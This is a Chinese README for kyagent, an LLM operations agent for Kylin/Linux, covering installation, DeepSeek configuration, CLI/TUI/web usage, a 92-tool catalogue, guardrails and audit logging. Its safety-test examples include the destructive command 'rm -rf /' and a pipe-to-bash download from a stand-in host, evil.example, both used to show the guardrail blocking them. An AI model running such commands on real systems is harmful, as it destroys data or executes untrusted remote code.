# kyagent

kyagent 是面向麒麟/Linux 的安全智能运维 Agent：用自然语言查询系统状态、调用受控运维工具、做安全拦截，并把执行链路写入审计日志。

默认 LLM backend 是 `deepseek_httpx`。DeepSeek key 可来自环境变量 `DEEPSEEK_API_KEY`，也可来自项目根 `kyagent.json`；任一位置有 key 都会启动真实 DeepSeek OpenAI-compatible HTTP 接口。两个位置都没有 key 时会直接报错，避免生产环境静默使用 mock。离线演示请显式设置 `KYAGENT_LLM_BACKEND=mock`。

架构和安全细节不放在根 README 里展开：

- [架构文档](docs/kyagent/architecture.md)
- [安全模型](docs/kyagent/safety-model.md)
- [完整项目说明](docs/kyagent/README.md)
- [LoongArch/Kylin 部署审查](docs/deployment/loongarch.md)
- [当前状态](docs/status/current.md)
- [工作日志](docs/status/log.md)

## 1. 快速开始

开发或演示环境：

```bash
python -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -e .
python -m pytest tests -q
```

Windows PowerShell 可以直接用模块入口：

```powershell
python -m pip install -e .
python -m kyagent tools list
python -m kyagent ask "查下 CPU 占用最高的进程"
```

常用冒烟命令：

```bash
kyagent tools list
kyagent safety test "rm -rf /"
kyagent ask "80 端口被谁占了？"
kyagent chat
kyagent tui
```

## 2. 一键配置环境

普通 Linux/macOS 开发环境：

```bash
bash scripts/install.sh
source .venv/bin/activate
kyagent tools list
kyagent chat
```

LoongArch/Kylin 推荐使用专用脚本。它会走零 Rust 默认路径：`deepseek_httpx`、`pydantic v1`、纯 httpx，不安装 OpenAI/Anthropic SDK。

```bash
cd /opt
sudo git clone <你的仓库地址> kyagent
cd /opt/kyagent
sudo bash scripts/install-loongarch.sh --dry-run --yes
sudo bash scripts/install-loongarch.sh --yes
```

常用参数：

```bash
bash scripts/install-loongarch.sh --help
sudo bash scripts/install-loongarch.sh --yes --python /usr/bin/python3.11
sudo bash scripts/install-loongarch.sh --yes --skip-system-packages
sudo bash scripts/install-loongarch.sh --yes --skip-sudoers
sudo bash scripts/install-loongarch.sh --yes --deepseek-key sk-... --run-deepseek-check
sudo bash scripts/install-loongarch.sh --yes --with-web
```

最小权限账户和 sudoers 白名单可单独配置：

```bash
sudo bash scripts/setup-sudoers.sh
sudo -u kyagent kyagent chat
```

LoongArch Old World 不要安装 `.[openai]`、`.[anthropic]`、`.[mcp]`；需要真实 LLM 时使用 `deepseek_httpx`。细节见 [LoongArch/Kylin 部署审查](docs/deployment/loongarch.md)。

Web 控制台是可选能力，不会进入 LoongArch 默认最小安装路径。需要浏览器演示时显式加 `--with-web`，该 extra 只安装 FastAPI 和标准版 uvicorn，不安装 `uvicorn[standard]`。

## 3. 配置 LLM Key

开发环境推荐 DeepSeek：

```bash
export DEEPSEEK_API_KEY=sk-...
export KYAGENT_CONFIG=$(pwd)/configs/deepseek.yaml
export KYAGENT_DEEPSEEK_TRANSPORT=deepseek_httpx
kyagent ask "查一下 80 端口被谁占了"
```

生产环境推荐写入 `/etc/kyagent/env`：

```bash
sudo install -m 0600 -o kyagent -g kyagent /dev/null /etc/kyagent/env
sudo sh -c 'cat > /etc/kyagent/env' <<'EOF'
KYAGENT_CONFIG=/opt/kyagent/configs/deepseek.yaml
KYAGENT_DEEPSEEK_TRANSPORT=deepseek_httpx
KYAGENT_AUDIT_DB=/var/lib/kyagent/audit.db
KYAGENT_AUDIT_JSONL=/var/log/kyagent/audit.jsonl
DEEPSEEK_API_KEY=sk-...
EOF
sudo chown kyagent:kyagent /etc/kyagent/env
sudo chmod 0600 /etc/kyagent/env
```

加载配置后以受限账户启动：

```bash
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tools list'
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent ask "80 端口被谁占了？"'
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tui'
```

临时切回 mock：

```bash
export KYAGENT_LLM_BACKEND=mock
kyagent ask "80 端口被谁占了？"
```

项目根 `kyagent.json` 也可以切换默认后端，并作为 DeepSeek key 的备用读取位置：

```json
{
  "llm_backend": "deepseek_httpx",
  "deepseek_api_key": "sk-..."
}
```

也支持嵌套写法：

```json
{
  "llm_backend": "deepseek_httpx",
  "deepseek": {
    "api_key": "sk-..."
  }
}
```

显式环境变量 `KYAGENT_LLM_BACKEND` 优先级高于 `kyagent.json` 的 `llm_backend`；`DEEPSEEK_API_KEY` 优先级高于 `kyagent.json` 里的 DeepSeek key。`kyagent.json` 如果写入真实 key，应按密钥文件管理，避免提交到仓库。

## 4. 启动和使用

单轮提问：

```bash
kyagent ask "哪个进程 CPU 占用最高？"
kyagent ask "80 端口被谁占了？"
kyagent ask "最近一小时 sshd 有哪些错误日志？"
```

交互式聊天：

```bash
kyagent chat
```

TUI：

```bash
kyagent tui
```

v2 流式 TUI 对标 Claude Code / OpenCode / Codex：

- 每条用户发言独立渲染为一个绿框 Panel（标题"你"），每条 agent 回答独立渲染为一个蓝框 Panel（标题"kyagent (backend)"），屏幕不再维护"对话历史大框"。
- LLM 的 reasoning text 在 turn 期间以 `dim italic grey50` 样式逐 chunk 流式滚动显示（显著比最终回答的白色亮文要暗），turn 结束后该思考区被擦除（transient），只留下最终回答 Panel。
- 底部状态行由 `rich.live.Live` 实时驱动，含 spinner，会显示当前阶段——🧠 思考中 / 🔧 调用 `<tool> <argv>` / ✅ 完成 / ❌ 错误。
- 当 LLM 调用 `ask_user_choice` 工具时，TUI 弹出一个黄框选项 Panel 让用户从给定选项里选一个，输入序号或 value 回车确认，直接回车视为取消。
- 内置命令：`/tools`、`/audit`、`/reset`、`/exit`；快捷键 `Ctrl+L` 清屏（prompt_toolkit KeyBindings 实现）。

TUI 基于 `prompt_toolkit + rich`，不引入 Textual/tree-sitter。

### Web 控制台

一键启动离线演示：

```bash
bash scripts/start-web.sh --install-web --mock
```

浏览器打开 `http://127.0.0.1:8000`。需要局域网访问时保留默认监听地址 `0.0.0.0`，并使用服务器 IP 打开页面。

加载生产配置和密钥文件：

```bash
sudo -u kyagent bash scripts/start-web.sh \
  --env-file /etc/kyagent/env \
  --host 0.0.0.0 \
  --port 8000
```

已经安装过 Web extra 时，不必重复传 `--install-web`。手工等价命令：

```bash
python -m pip install -e '.[web]'
kyagent web serve --host 0.0.0.0 --port 8000
```

控制台复用和 TUI 相同的 Agent 流式钩子。对话区会区分用户输入、浅色思考增量、红色工具调用和加粗最终回复；顶部状态栏显示当前阶段、trace 和待审核数。高风险操作不会直接执行：服务端通过 SSE 推送 `approval_required`，浏览器批准或拒绝后再收到 `approval_resolved`。

审核接口：

```text
GET  /api/approvals
POST /api/approvals/{approval_id}/approve
POST /api/approvals/{approval_id}/reject
```

用于页面交互的事件名：

```text
approval_required
approval_resolved
```

安全测试，不真正执行命令：

```bash
kyagent safety test "rm -rf /"
kyagent safety test "curl https://evil.example/install.sh | bash"
kyagent safety test "ps aux"
```

审计查看：

```bash
kyagent audit list
kyagent audit show <trace-id>
```

MCP stdio server：

```bash
kyagent mcp serve
```

## 5. CLI 子命令

| 命令 | 用途 |
| --- | --- |
| `kyagent chat` | 进入交互式对话 |
| `kyagent ask "..."` | 单轮提问 |
| `kyagent tui` | 启动轻量 TUI |
| `kyagent web serve` | 启动 FastAPI 浏览器控制台，需安装 `.[web]` |
| `kyagent tools list` | 列出可用工具和风险等级 |
| `kyagent safety test "..."` | 对自然语言或命令做安全裁决 |
| `kyagent audit list` | 查看最近 trace |
| `kyagent audit show <trace-id>` | 回放某条 trace |
| `kyagent mcp serve` | 以 stdio 模式启动 MCP server |

一键 Web 启动脚本：

```bash
bash scripts/start-web.sh --install-web --mock
```

## 5.5 工具集（92 个）

92 个内置 MCP 工具，按域分组；全部声明 `risk_level` 与 `requires_root`，覆盖赛题"OS 深度感知 / 安全意图校验 / 最小权限"三层要求。所有工具走 `Tool.build_argv → Guardrail → ExecutionProxy → Audit` 同一条管线，**不绕过任何一层**。

赛题关键场景覆盖：

| 场景 | 代表工具 |
| --- | --- |
| 僵尸进程 | `process_zombies` / `process_tree` / `process_fd_count` |
| 磁盘 I/O 异常 | `disk_io_stats`（TrendTool）/ `disk_io_diskstats` / `disk_inode_usage` |
| 配置漂移 | `pkg_verify` / `compl_file_hash` / `compl_aide_check` / `svc_show` / `svc_cat` |
| 大日志暴增 | `log_files_top` / `log_size_sample` / `log_rotated_count` |
| 麒麟加分项 | `sec_kysec_status`（`/sys/kernel/security/kysec/state`）|
| LoongArch 专属 | `la_arch_info` / `la_world_check`（New/Old World 判定）/ `la_binary_compat` |

#### 进程与资源（8）

| 工具 | 用途 |
| --- | --- |
| `process_list` / `process_tree` / `process_zombies` | 进程列表、父子森林、僵尸专项 |
| `process_fd_count` / `process_resource` | `/proc/PID/fd` 泄漏盘点、`/proc/PID/status` 资源占用 |
| `top_cpu_snapshot` | 一次性 `top -bn1` 快照 |
| `lsof_port` / `lsof_pid` | 端口占用、PID 文件句柄 |

#### 服务与启动（12）

| 工具 | 用途 |
| --- | --- |
| `svc_status` / `svc_list` / `svc_is_active` / `svc_is_enabled` | 只读状态查询 |
| `svc_show` / `svc_cat` / `svc_failed` / `svc_timers` | 配置漂移与故障定位 |
| `svc_restart` / `svc_reload` | 变更类，HIGH 风险走 confirm + sudoers |
| `boot_analyze` / `boot_logs` | `systemd-analyze blame` / `journalctl -b -p err` |

#### 网络（12）

| 工具 | 用途 |
| --- | --- |
| `net_listen` / `net_connections` / `net_conn_state_summary` | 监听端口、连接、TCP 状态聚合 |
| `net_routes` / `net_arp` / `net_addr` / `net_link_stats` | 路由 / ARP / 地址 / 网卡计数器（JSON） |
| `net_dns_resolve` / `net_ping` / `net_tcp_stats` | DNS 验证、连通、协议栈总览 |
| `net_firewall_iptables` / `net_firewall_nft` | 防火墙规则（需 root） |

#### 日志（9）

| 工具 | 用途 |
| --- | --- |
| `log_journal` / `log_dmesg` | journal / 内核环形缓冲 |
| `log_files_top` / `log_size_sample` / `log_rotated_count` | 日志暴增定位 + 滚动文件枚举 |
| `log_grep_recent` / `log_ssh_audit` / `log_auth_failed` | 关键字 / sshd / 鉴权失败 |
| `log_audit_summary` | `aureport --summary` |

#### 文件系统（4）

`fs_df` / `fs_du` / `fs_ls` / `fs_find` — 全部只读，禁 `-exec`，禁读 `/etc/shadow` 等敏感路径。

#### 包管理（8，含 PkgFamilyMixin 自适配）

| 工具 | 用途 |
| --- | --- |
| `pkg_info` / `pkg_installed` | 单包信息 / 已安装清单 |
| `pkg_verify` | **配置漂移检测**：`rpm -V` 或 `debsums -c`，按发行版透明切换 |
| `pkg_updates` / `pkg_security_updates` | 可升级 / 安全升级清单 |
| `pkg_owns_file` / `pkg_repo_list` / `pkg_history` | 反查归属、源、操作历史 |

#### 磁盘 / I/O（7）

| 工具 | 用途 |
| --- | --- |
| `disk_io_stats` | **TrendTool**：`iostat -dx 1 2` 一次得 delta，不在 Python 端 sleep |
| `disk_io_diskstats` | 读 `/proc/diskstats` 原始计数（LLM 自行调两次算 delta） |
| `disk_inode_usage` / `disk_mount` / `disk_open_deleted` | inode、挂载选项、已删除句柄 |
| `disk_smart` / `dir_largest_files` | SMART 健康、大文件定位 |

#### 系统态势（9）

`sys_uptime` / `sys_loadavg` / `sys_memory` / `sys_swap` / `sys_kernel` / `sys_cpu_info` / `sys_dmi` / `sys_time_sync` / `sys_block_devices` —— 开机巡检的最小集合。

#### 安全（13）

| 工具 | 用途 |
| --- | --- |
| `sec_kysec_status` | **麒麟 KySec 状态**（赛题加分项，读 `/sys/kernel/security/kysec/state`） |
| `sec_selinux_status` / `sec_apparmor_status` | SELinux / AppArmor MAC 框架 |
| `sec_setuid_files` / `sec_world_writable` / `sec_capabilities` | 提权面盘点 |
| `sec_passwd_audit` / `sec_sudoers_audit` / `sec_ssh_config` | 高危账户 / sudo 授权 / sshd 有效配置 |
| `sec_kernel_taints` / `sec_kernel_modules` | tainted 位解码 / lsmod |
| `sec_listening_external` / `sec_audit_status` | 外网监听暴露 / auditd 状态 |

#### 合规 / 完整性（6）

`compl_aide_check` / `compl_file_attr` / `compl_file_hash` / `compl_timestamp_audit` / `compl_hosts` / `compl_cron_dump` —— **配置漂移检测**主战场（AIDE 基线、SHA-256、lsattr、stat 时间戳、hosts、crontab 后门）。

#### LoongArch 专属（3）

| 工具 | 用途 |
| --- | --- |
| `la_arch_info` | `/proc/cpuinfo` 关键字段（CPU Family / Model Name / Revision） |
| `la_world_check` | 通过 `ld-linux-loongarch-lp64d.so.1` 判定 New World vs Old World |
| `la_binary_compat` | `file(1)` 判定异架构二进制能否落地 |

#### 交互（1）

`ask_user_choice` — LLM 主动反询：给出预定选项让用户挑一个，TUI 弹黄框选项面板。不走 ExecutionProxy。

## 6. 配置文件

| 文件 | 说明 |
| --- | --- |
| [configs/default.yaml](configs/default.yaml) | 默认配置，`llm_backend` 默认是 `deepseek_httpx` |
| [configs/deepseek.yaml](configs/deepseek.yaml) | 推荐真实 LLM 配置 |
| [configs/openai.yaml](configs/openai.yaml) | OpenAI-compatible SDK 示例 |
| [configs/qwen.yaml](configs/qwen.yaml) | Qwen/DashScope 示例 |
| [configs/intent-rules.yaml](configs/intent-rules.yaml) | 自然语言意图风险规则 |
| [configs/safety-rules.yaml](configs/safety-rules.yaml) | 工具/命令安全规则 |
| [configs/sudoers.kyagent](configs/sudoers.kyagent) | 最小权限 sudoers 白名单 |

最常用的覆盖项：

```bash
export KYAGENT_CONFIG=$(pwd)/configs/deepseek.yaml
export KYAGENT_LLM_BACKEND=deepseek_httpx
export DEEPSEEK_API_KEY=sk-...
export KYAGENT_AUDIT_DB=/var/lib/kyagent/audit.db
export KYAGENT_AUDIT_JSONL=/var/log/kyagent/audit.jsonl
```

## 7. 验收命令

本地开发验收：

```bash
python -m pytest tests -q
kyagent tools list
kyagent safety test "rm -rf /"
kyagent ask "查下 CPU 占用最高的进程"
bash scripts/start-web.sh --mock
```

生产/受限账户验收：

```bash
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tools list'
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent safety test "rm -rf /"'
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent ask "80 端口被谁占了？"'
sudo -u kyagent bash /opt/kyagent/scripts/start-web.sh --env-file /etc/kyagent/env
```

## 8. Windows 本机测试

整个 Python 代码路径都是跨平台的：配置加载、安全规则裁决、意图层、审计落盘（SQLite + JSONL）、Agent 主循环、所有 LLM 后端（`mock` / `deepseek_httpx` / `openai` / `qwen` …）以及 CLI/TUI 都可以直接在 Windows 上跑，单测也是全平台通过的。

**唯一例外是工具实际执行。** `ExecutionProxy` 在 `kyagent/executor/proxy.py:116` 显式检测 `sys.platform == "win32"`，在 Windows 上不会调用 `ps / lsof / netstat / systemctl / journalctl` 这类 POSIX 命令，而是返回形如 `[mock][win32] would execute: ...` 的占位输出，`run_as` 字段为 `mock`、`skipped_reason` 为 `windows_mock`。这是显式设计，不是 bug：这些 Linux 工具在 Windows 上不存在，强行执行会失败；走 mock 让你可以在 Windows 上跑通整条 ReAct 链路（LLM 选工具 → 沙箱代理 → 审计），看真实运维数据仍必须回到 Kylin/Linux 主机。

可以在 Windows 上**真实验证**的功能：

- `python -m pytest tests -q` 全量单测
- LLM 后端真正发请求（DeepSeek/Qwen/OpenAI/Anthropic 等都是纯 httpx 或纯 SDK，跨平台）
- `kyagent safety test "..."`、自然语言意图规则
- 审计落盘和 `kyagent audit list/show`
- `kyagent tools list`、`kyagent chat`、`kyagent tui`、`kyagent ask`（含完整 Agent 多轮调度）
- `kyagent web serve` 和 `scripts/start-web.sh`（安装 `.[web]` 后可用）
- `kyagent.json` 覆盖、`KYAGENT_*` 环境变量、`KYAGENT_CONFIG` 切换

在 Windows 上**只会得到 mock 输出**的部分：

- `kyagent ask` 的工具落地结果（LLM 仍会基于 mock 文本继续推理）
- `kyagent mcp serve` 转发到底层命令的部分
- `scripts/install-loongarch.sh`、`scripts/setup-sudoers.sh`、`/etc/kyagent/env` 这些 POSIX-only 流程整体不适用

PowerShell 步骤：

```powershell
py -3.11 -m venv .venv
.\.venv\Scripts\Activate.ps1
python -m pip install --upgrade pip
python -m pip install -e .
python -m pytest tests -q

# 离线演示（不需要 key）
$env:KYAGENT_LLM_BACKEND = "mock"
python -m kyagent tools list
python -m kyagent safety test "rm -rf /"
python -m kyagent ask "查下 CPU 占用最高的进程"
python -m pip install -e '.[web]'
python -m kyagent web serve --host 127.0.0.1 --port 8000

# 真实 LLM：DeepSeek key + 默认 httpx 后端
Remove-Item Env:KYAGENT_LLM_BACKEND
$env:DEEPSEEK_API_KEY = "sk-..."
python -m kyagent ask "80 端口被谁占了？"
python -m kyagent tui
```

`python -m kyagent tui` 在 Windows PowerShell 上也能正常跑：Console 用 `force_terminal=True, legacy_windows=False`，`prompt_toolkit` 输入会被 `patch_stdout` 包住，`rich.live.Live` 的状态栏不会与输入行打架。工具执行仍走 `[mock][win32]` 占位，但底部 "思考中… / 调用 lsof_port …" 这条状态线是真实驱动的——可以直接观察到 agent 在选哪个工具、参数是什么。

v2 流式 TUI 在 Windows 同样可用：每条发言独立 Panel、思考流以 `dim italic grey50` 实时打印、`Ctrl+L` 清屏、`ask_user_choice` 黄框选项面板都正常工作。工具执行结果仍是 `[mock][win32]` 占位，但思考流和工具调用状态行都是真实驱动的——可以肉眼观察 agent 在选哪个工具、思考什么。

也可以把 key 写到项目根 `kyagent.json`（注意不要提交）：

```json
{
  "llm_backend": "deepseek_httpx",
  "deepseek_api_key": "sk-..."
}
```

> Windows 上跑 `kyagent ask` 时，工具执行结果会以 `[mock][win32]` 开头；LLM 看到 mock 输出仍会继续推理并产生答案，足以验证「自然语言 → 安全裁决 → 工具选择 → 审计」整条链路。要看 `ps/lsof/journalctl` 的真实结果，请回到 Kylin/Linux 主机或本仓库的部署脚本路径。
